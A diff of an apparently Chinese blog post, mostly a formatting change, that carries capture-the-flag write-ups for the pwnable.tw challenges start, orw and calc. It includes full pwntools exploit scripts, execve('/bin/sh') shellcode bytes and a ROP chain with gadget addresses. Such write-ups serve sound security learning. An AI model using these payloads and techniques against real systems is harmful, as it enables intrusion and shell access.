@@ -145,13 +145,9 @@
           
           
 
-          
-
-<h2 id="start">start</h2>
-
+          <h2 id="start">start</h2>
 <p>查看汇编代码:</p>
-
-<pre><code class="language-x86asm">08048060 &lt;_start&gt;:
+<pre><code class="language-x86asm" data-lang="x86asm">08048060 &lt;_start&gt;:
  8048060:       54                      push   %esp
  8048061:       68 9d 80 04 08          push   $0x804809d
  8048066:       31 c0                   xor    %eax,%eax
@@ -180,29 +176,20 @@
  804809e:       31 c0                   xor    %eax,%eax
  80480a0:       40                      inc    %eax
  80480a1:       cd 80                   int    $0x80
-</code></pre>
-
-<p>可以看到汇编代码使用的是 <code>int 80</code> 陷入中断的方式进行系统调用，这是 Linux 2.6 之前的通用做法，在这里贴一个 syscall 的相应链接供参考： <a href="https://w3challs.com/syscalls/" rel="nofollow noreferrer" target="_blank">https://w3challs.com/syscalls/</a></p>
-
+</code></pre><p>可以看到汇编代码使用的是 <code>int 80</code> 陷入中断的方式进行系统调用，这是 Linux 2.6 之前的通用做法，在这里贴一个 syscall 的相应链接供参考： <a href="https://w3challs.com/syscalls/">https://w3challs.com/syscalls/</a></p>
 <p>根据代码推测逻辑如下：</p>
-
-<pre><code class="language-C">void _start() {
-    char buf[20] = &quot;Let's start the CTF:&quot;;
-    sys_write(1,buf,20);
-    sys_read(0,buf,60);
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C" data-lang="C"><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">_start</span>() {
+    <span style="color:#66d9ef">char</span> buf[<span style="color:#ae81ff">20</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;Let&#39;s start the CTF:&#34;</span>;
+    sys_write(<span style="color:#ae81ff">1</span>,buf,<span style="color:#ae81ff">20</span>);
+    sys_read(<span style="color:#ae81ff">0</span>,buf,<span style="color:#ae81ff">60</span>);
 }
-void _exit() {
+<span style="color:#66d9ef">void</span> <span style="color:#a6e22e">_exit</span>() {
     sys_exit();
 }
-</code></pre>
-
-<p>很明显栈的长度有限因此如果输入长度超过 20 的话，能够导致栈溢出。因此我们只需要在栈上写入一段 shellcode 并通过控制程序控制流的方式即可 get shell，但这里有以下一个问题，由于 ASLR 的问题，无法获得栈的基地址。这也使得我们无法直接确认可以跳转的地址，因此需要泄露栈基地址。</p>
-
+</code></pre></div><p>很明显栈的长度有限因此如果输入长度超过 20 的话，能够导致栈溢出。因此我们只需要在栈上写入一段 shellcode 并通过控制程序控制流的方式即可 get shell，但这里有以下一个问题，由于 ASLR 的问题，无法获得栈的基地址。这也使得我们无法直接确认可以跳转的地址，因此需要泄露栈基地址。</p>
 <p>此时发现有 <code>add    $0x14,%esp</code> 可以得到栈的基地址(<code>esp</code>)，因此如果修改返回地址，将程序返回到地址 <code>0x08048087</code>，此时程序相当于执行了 <code>sys_write(1,esp,20)</code>，就能泄露我们需要的栈地址了。剩下的工作则是编写 shellcode 和计算相应的偏移。</p>
-
 <p>shellcode 对应的代码如下(这里参考了 DogeWatch&rsquo;s Blog 的做法)，实际上的结果就是执行了 <code>execve(&quot;/bin//sh&quot;, NULL, NULL)</code>:</p>
-
-<pre><code class="language-x86asm">31 c9                   xor    ecx,ecx
+<pre><code class="language-x86asm" data-lang="x86asm">31 c9                   xor    ecx,ecx
 f7 e1                   mul    ecx
 51                      push   ecx
 68 2f 2f 73 68          push   0x68732f2f
@@ -210,142 +197,110 @@ f7 e1                   mul    ecx
 89 e3                   mov    ebx,esp
 b0 0b                   mov    al,0xb
 cd 80                   int    0x80
-</code></pre>
+</code></pre><p>最终脚本如下：</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
 
-<p>最终脚本如下：</p>
+DEBUG <span style="color:#f92672">=</span> False
 
-<pre><code class="language-python">from pwn import *
+<span style="color:#66d9ef">if</span> DEBUG:
+    r <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#34;./start&#34;</span>)
+<span style="color:#66d9ef">else</span>:
+    r <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;chall.pwnable.tw&#34;</span>, <span style="color:#ae81ff">10000</span>)
 
-DEBUG = False
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">leak</span>():
+    <span style="color:#66d9ef">print</span>(r<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;:&#34;</span>))
+    payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;a&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">20</span> <span style="color:#f92672">+</span> p32(<span style="color:#ae81ff">0x08048087</span>)
+    r<span style="color:#f92672">.</span>send(payload)
+    stack_addr <span style="color:#f92672">=</span> u32(r<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">4</span>))
+    <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;stack address is {}&#34;</span><span style="color:#f92672">.</span>format(hex(stack_addr)))
+    <span style="color:#66d9ef">return</span> stack_addr
 
-if DEBUG:
-    r = process(&quot;./start&quot;)
-else:
-    r = remote(&quot;chall.pwnable.tw&quot;, 10000)
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">pwn</span>(stack_addr):
+    shellcode <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80</span><span style="color:#e6db74">&#39;</span>
+    payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;a&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">20</span> <span style="color:#f92672">+</span> p32(stack_addr<span style="color:#f92672">+</span><span style="color:#ae81ff">20</span>) <span style="color:#f92672">+</span> shellcode
+    r<span style="color:#f92672">.</span>send(payload)
 
-def leak():
-    print(r.recvuntil(&quot;:&quot;))
-    payload = 'a'*20 + p32(0x08048087)
-    r.send(payload)
-    stack_addr = u32(r.recv(4))
-    print(&quot;stack address is {}&quot;.format(hex(stack_addr)))
-    return stack_addr
-
-def pwn(stack_addr):
-    shellcode = '\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80'
-    payload = 'a'*20 + p32(stack_addr+20) + shellcode
-    r.send(payload)
-
-def main():
-    stack_addr = leak()
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">main</span>():
+    stack_addr <span style="color:#f92672">=</span> leak()
     pwn(stack_addr)
-    r.interactive()
+    r<span style="color:#f92672">.</span>interactive()
 
 main()
-</code></pre>
-
-<p>得到 FLAG{Pwn4bl3_tW_1s_y0ur_st4rt}</p>
-
+</code></pre></div><p>得到 FLAG{Pwn4bl3_tW_1s_y0ur_st4rt}</p>
 <p>思路回顾整理如下：</p>
-
 <ol>
 <li>发现存在栈溢出 =&gt; 栈溢出执行 shellcode</li>
 <li>栈地址随意化 =&gt; 泄露栈地址</li>
 <li>根据栈地址编写 shellcode</li>
 </ol>
-
 <h2 id="orw">orw</h2>
-
 <p>本题主要考查的是 shellcode 的编写能力，<code>orw</code> 即为 <code>open</code> / <code>read</code> / <code>write</code> 的三项基本操作。</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
 
-<pre><code class="language-python">from pwn import *
+shellcode <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;&#39;
+</span><span style="color:#e6db74">_start:
+</span><span style="color:#e6db74">    jmp end
+</span><span style="color:#e6db74">open:
+</span><span style="color:#e6db74">    pop ebx
+</span><span style="color:#e6db74">    mov ecx, 0
+</span><span style="color:#e6db74">    mov eax, 5
+</span><span style="color:#e6db74">    int 0x80
+</span><span style="color:#e6db74">    mov ebx, eax
+</span><span style="color:#e6db74">    mov ecx, esp
+</span><span style="color:#e6db74">    mov edx, 40
+</span><span style="color:#e6db74">    mov eax, 3
+</span><span style="color:#e6db74">    int 0x80
+</span><span style="color:#e6db74">    mov ebx, 1
+</span><span style="color:#e6db74">    mov eax, 4
+</span><span style="color:#e6db74">    int 0x80
+</span><span style="color:#e6db74">    mov eax, 1
+</span><span style="color:#e6db74">    int 0x80
+</span><span style="color:#e6db74">end:
+</span><span style="color:#e6db74">    call open
+</span><span style="color:#e6db74">&#39;&#39;&#39;</span>
 
-shellcode = '''
-_start:
-    jmp end
-open:
-    pop ebx
-    mov ecx, 0
-    mov eax, 5
-    int 0x80
-    mov ebx, eax
-    mov ecx, esp
-    mov edx, 40
-    mov eax, 3
-    int 0x80
-    mov ebx, 1
-    mov eax, 4
-    int 0x80
-    mov eax, 1
-    int 0x80
-end:
-    call open
-'''
+r <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#39;chall.pwnable.tw&#39;</span>, <span style="color:#ae81ff">10001</span>)
 
-r = remote('chall.pwnable.tw', 10001)
-
-shellcode = asm(shellcode)
-r.sendlineafter(':', shellcode+&quot;/home/orw/flag\x00&quot;)
-r.interactive()
-</code></pre>
-
-<h2 id="calc">calc</h2>
-
+shellcode <span style="color:#f92672">=</span> asm(shellcode)
+r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;:&#39;</span>, shellcode<span style="color:#f92672">+</span><span style="color:#e6db74">&#34;/home/orw/flag</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span>)
+r<span style="color:#f92672">.</span>interactive()
+</code></pre></div><h2 id="calc">calc</h2>
 <p>本题需要先理解程序的逻辑，利用 ida 查看对应源码：</p>
-
-<p><figure><img src="/images/ring.svg" data-sizes="auto" data-src="/images/posts/pwnable-tw-1.0/calc-calc.png" alt="calc" class="lazyload"><figcaption class="image-caption">calc</figcaption></figure></p>
-
+<p><img src="/images/posts/pwnable-tw-1.0/calc-calc.png" alt="calc"></p>
 <p>可以很明显地看到程序的逻辑如下：</p>
-
 <ol>
 <li>调用 <code>get_expr</code> 函数过滤除了 +，-，*，/，% 和数字之外的其他字符</li>
 <li><code>init_pool</code> 函数会初始化保存中间数据的一段内存，这里我将其重命名为 <code>pool</code> 方便理解</li>
 <li><code>parse_expr</code> 函数对表达式进行解析，并将结果写到 <code>pool</code> 上</li>
 <li>输出 <code>pool</code> 上保存的最终值</li>
 </ol>
-
 <p>下面一个函数则是程序的漏洞所在：</p>
-
-<p><figure><img src="/images/ring.svg" data-sizes="auto" data-src="/images/posts/pwnable-tw-1.0/calc-eval.png" alt="eval" class="lazyload"><figcaption class="image-caption">eval</figcaption></figure></p>
-
+<p><img src="/images/posts/pwnable-tw-1.0/calc-eval.png" alt="eval"></p>
 <p>如果按照正常的执行过程，程序的结构如下：</p>
-
 <ul>
 <li>pool[0] = 2</li>
 <li>pool[1] = num1</li>
 <li>pool[2] = num2</li>
 </ul>
-
 <p>然后执行完后变成：</p>
-
 <ul>
 <li>pool[0] = 1</li>
 <li>pool[1] = num1 OP num2</li>
 </ul>
-
 <p>但如果用户以 <code>+600</code> 作为输入的话，则是如下结果：</p>
-
 <ul>
 <li>pool[0] = 1</li>
 <li>pool[1] = 600</li>
 </ul>
-
 <p>执行完则成为：</p>
-
 <ul>
 <li>pool[0] = 600</li>
 </ul>
-
 <p>如果我们的输入是 <code>+600+300</code>，则最终结果会变成 <code>pool[600] += 300</code>, 由此触发了对栈上任意地址的写操作。</p>
-
 <p>而且由于我们拥有的是任意地址写，所以可以绕过 canary 对栈的防护。很明显我们可以通过任意地址写来劫持程序的控制流，最终触发 <code>system(&quot;/bin/sh&quot;)</code></p>
-
 <p>由于开启了 NX，栈上不能直接执行 shellcode，而且由于程序是静态链接的，因此不能通过修改 GOT 表的方式调用 sys 函数,所以需要通过 ROP 劫持控制流,进而通过 <code>int 0x80</code> 进行系统调用。</p>
-
-<p>在这之前，我们需要清楚程序的栈结构，这里可以参考 <a href="https://www.freebuf.com/articles/others-articles/132283.html" rel="nofollow noreferrer" target="_blank">Pwnable.tw刷题之calc</a>，个人认为其中的两个示意图非常清晰，易于理解。</p>
-
+<p>在这之前，我们需要清楚程序的栈结构，这里可以参考 <a href="https://www.freebuf.com/articles/others-articles/132283.html">Pwnable.tw刷题之calc</a>，个人认为其中的两个示意图非常清晰，易于理解。</p>
 <p>最后需要构造的栈结构如下：</p>
-
 <pre><code>pool[370] = u32(&quot;/sh\x00&quot;)
 pool[369] = u32(&quot;/bin&quot;)
 pool[368] = 0x08049a21 // int 0x80
@@ -356,89 +311,79 @@ pool[364] = 0
 pool[363] = 0x080701aa // pop edx;ret
 pool[362] = 11
 pool[361] = 0x0805c34b // pop eax;ret
-</code></pre>
-
-<p>下面需要思考的则是如何获取 <code>&quot;/bin/sh\x00&quot;</code> 字符串所指向的地址。我们可以通过保存在 <code>pool[360]</code> 上的 <code>ebp</code>，即 main 函数的栈基地址推算出字符串对应的地址，具体推算示意图如下：</p>
-
-<p><figure><img src="/images/ring.svg" data-sizes="auto" data-src="/images/posts/pwnable-tw-1.0/calc-stack.png" alt="stack" class="lazyload"><figcaption class="image-caption">stack</figcaption></figure></p>
-
+</code></pre><p>下面需要思考的则是如何获取 <code>&quot;/bin/sh\x00&quot;</code> 字符串所指向的地址。我们可以通过保存在 <code>pool[360]</code> 上的 <code>ebp</code>，即 main 函数的栈基地址推算出字符串对应的地址，具体推算示意图如下：</p>
+<p><img src="/images/posts/pwnable-tw-1.0/calc-stack.png" alt="stack"></p>
 <p>构造脚本如下：</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
 
-<pre><code class="language-python">from pwn import *
+LOCAL <span style="color:#f92672">=</span> <span style="color:#f92672">not</span> True
+DEBUG <span style="color:#f92672">=</span> False
 
-LOCAL = not True
-DEBUG = False
+<span style="color:#66d9ef">if</span> LOCAL:
+    r <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#34;./calc&#34;</span>)
+    <span style="color:#66d9ef">if</span> DEBUG:
+        context<span style="color:#f92672">.</span>terminal <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#39;gnome-terminal&#39;</span>, <span style="color:#e6db74">&#39;-x&#39;</span>, <span style="color:#e6db74">&#39;sh&#39;</span>, <span style="color:#e6db74">&#39;-c&#39;</span>]
+        gdb<span style="color:#f92672">.</span>attach(proc<span style="color:#f92672">.</span>pidof(s)[<span style="color:#ae81ff">0</span>])
+<span style="color:#66d9ef">else</span>:
+    r <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;chall.pwnable.tw&#34;</span>, <span style="color:#ae81ff">10100</span>)
 
-if LOCAL:
-    r = process(&quot;./calc&quot;)
-    if DEBUG:
-        context.terminal = ['gnome-terminal', '-x', 'sh', '-c']
-        gdb.attach(proc.pidof(s)[0])
-else:
-    r = remote(&quot;chall.pwnable.tw&quot;, 10100)
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">leak</span>():
+    payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;+360&#34;</span>
+    r<span style="color:#f92672">.</span>sendline(payload)
+    base <span style="color:#f92672">=</span> int(r<span style="color:#f92672">.</span>recv()<span style="color:#f92672">.</span>strip())
+    <span style="color:#66d9ef">return</span> base <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xFFFFFFFF</span>
 
-def leak():
-    payload = &quot;+360&quot;
-    r.sendline(payload)
-    base = int(r.recv().strip())
-    return base &amp; 0xFFFFFFFF
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">get_ebp</span>(base):
+    size <span style="color:#f92672">=</span> base <span style="color:#f92672">-</span> (base <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xFFFFFFF0</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">16</span>)
+    <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;base is {}&#34;</span><span style="color:#f92672">.</span>format(hex(base)))
+    <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;stack size is {}&#34;</span><span style="color:#f92672">.</span>format(size))
+    ebp <span style="color:#f92672">=</span> base <span style="color:#f92672">-</span> (size <span style="color:#f92672">+</span> <span style="color:#ae81ff">4</span>) <span style="color:#f92672">+</span> <span style="color:#ae81ff">32</span>
+    <span style="color:#66d9ef">if</span> ebp <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0x8FFFFFFF</span>:
+        ebp <span style="color:#f92672">-=</span> <span style="color:#ae81ff">0x100000000</span>
+    <span style="color:#66d9ef">return</span> ebp
 
-def get_ebp(base):
-    size = base - (base &amp; 0xFFFFFFF0 - 16)
-    print(&quot;base is {}&quot;.format(hex(base)))
-    print(&quot;stack size is {}&quot;.format(size))
-    ebp = base - (size + 4) + 32
-    if ebp &gt; 0x8FFFFFFF:
-        ebp -= 0x100000000
-    return ebp
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">write</span>(pos, value):
+    payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;+{}&#34;</span><span style="color:#f92672">.</span>format(pos)
+    r<span style="color:#f92672">.</span>sendline(payload)
+    v1 <span style="color:#f92672">=</span> int(r<span style="color:#f92672">.</span>recv()<span style="color:#f92672">.</span>strip())
+    v2 <span style="color:#f92672">=</span> value <span style="color:#f92672">-</span> v1
+    payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;+{}{}{}&#34;</span><span style="color:#f92672">.</span>format(pos, <span style="color:#e6db74">&#39;+&#39;</span> <span style="color:#66d9ef">if</span> v2 <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span> <span style="color:#66d9ef">else</span> <span style="color:#e6db74">&#39;&#39;</span>, v2)
+    r<span style="color:#f92672">.</span>sendline(payload)
+    r<span style="color:#f92672">.</span>recv()
 
-def write(pos, value):
-    payload = &quot;+{}&quot;.format(pos)
-    r.sendline(payload)
-    v1 = int(r.recv().strip())
-    v2 = value - v1
-    payload = &quot;+{}{}{}&quot;.format(pos, '+' if v2 &gt; 0 else '', v2)
-    r.sendline(payload)
-    r.recv()
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">pwn</span>():
+    <span style="color:#75715e"># leak</span>
+    base <span style="color:#f92672">=</span> leak()
+    <span style="color:#75715e"># 0x0805c34b : pop eax ; ret</span>
+    write(<span style="color:#ae81ff">361</span>, <span style="color:#ae81ff">0x0805c34b</span>)
+    write(<span style="color:#ae81ff">362</span>, <span style="color:#ae81ff">11</span>)
+    <span style="color:#75715e"># 0x080701aa : pop edx ; ret</span>
+    write(<span style="color:#ae81ff">363</span>, <span style="color:#ae81ff">0x080701aa</span>)
+    write(<span style="color:#ae81ff">364</span>, <span style="color:#ae81ff">0</span>)
+    <span style="color:#75715e"># 0x080701d1 : pop ecx ; pop ebx ; ret</span>
+    write(<span style="color:#ae81ff">365</span>, <span style="color:#ae81ff">0x080701d1</span>)
+    write(<span style="color:#ae81ff">366</span>, <span style="color:#ae81ff">0</span>)
+    write(<span style="color:#ae81ff">367</span>, get_ebp(base))
+    <span style="color:#75715e"># 0x08049a21 : int 0x80</span>
+    write(<span style="color:#ae81ff">368</span>, <span style="color:#ae81ff">0x08049a21</span>)
+    write(<span style="color:#ae81ff">369</span>, u32(<span style="color:#e6db74">&#34;/bin&#34;</span>))
+    write(<span style="color:#ae81ff">370</span>, u32(<span style="color:#e6db74">&#34;/sh</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span>))
 
-def pwn():
-    # leak
-    base = leak()
-    # 0x0805c34b : pop eax ; ret
-    write(361, 0x0805c34b)
-    write(362, 11)
-    # 0x080701aa : pop edx ; ret
-    write(363, 0x080701aa)
-    write(364, 0)
-    # 0x080701d1 : pop ecx ; pop ebx ; ret
-    write(365, 0x080701d1)
-    write(366, 0)
-    write(367, get_ebp(base))
-    # 0x08049a21 : int 0x80
-    write(368, 0x08049a21)
-    write(369, u32(&quot;/bin&quot;))
-    write(370, u32(&quot;/sh\x00&quot;))
-
-def main():
-    print(r.recvuntil(&quot;=== Welcome to SECPROG calculator ===\n&quot;))
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">main</span>():
+    <span style="color:#66d9ef">print</span>(r<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;=== Welcome to SECPROG calculator ===</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>))
     pwn()
-    r.interactive()
+    r<span style="color:#f92672">.</span>interactive()
 
-if __name__ == '__main__':
+<span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;__main__&#39;</span>:
     main()
-</code></pre>
-
-<h2 id="小结">小结</h2>
-
+</code></pre></div><h2 id="小结">小结</h2>
 <p>花了一周来做（理解）这三道题，希望这次 pwn 的（再）入门能成功（残念</p>
-
 <h2 id="参考链接">参考链接</h2>
-
 <ol>
-<li><a href="http://dogewatch.github.io/2017/04/10/pwnable.tw-Part1/" rel="nofollow noreferrer" target="_blank">DogeWatch&rsquo;s Blog | Pwnable.tw Part(1)</a></li>
-<li><a href="http://showlinkroom.me/2017/01/22/pwnable-tw/" rel="nofollow noreferrer" target="_blank">l1nk3dHouse | pwnable-tw</a></li>
-<li><a href="https://www.freebuf.com/articles/others-articles/132283.html" rel="nofollow noreferrer" target="_blank">Pwnable.tw刷题之calc</a></li>
-<li><a href="https://www.jianshu.com/p/d59a41d85af1" rel="nofollow noreferrer" target="_blank">Pwnable.tw calc</a></li>
+<li><a href="http://dogewatch.github.io/2017/04/10/pwnable.tw-Part1/">DogeWatch&rsquo;s Blog | Pwnable.tw Part(1)</a></li>
+<li><a href="http://showlinkroom.me/2017/01/22/pwnable-tw/">l1nk3dHouse | pwnable-tw</a></li>
+<li><a href="https://www.freebuf.com/articles/others-articles/132283.html">Pwnable.tw刷题之calc</a></li>
+<li><a href="https://www.jianshu.com/p/d59a41d85af1">Pwnable.tw calc</a></li>
 </ol>
 
     </div>
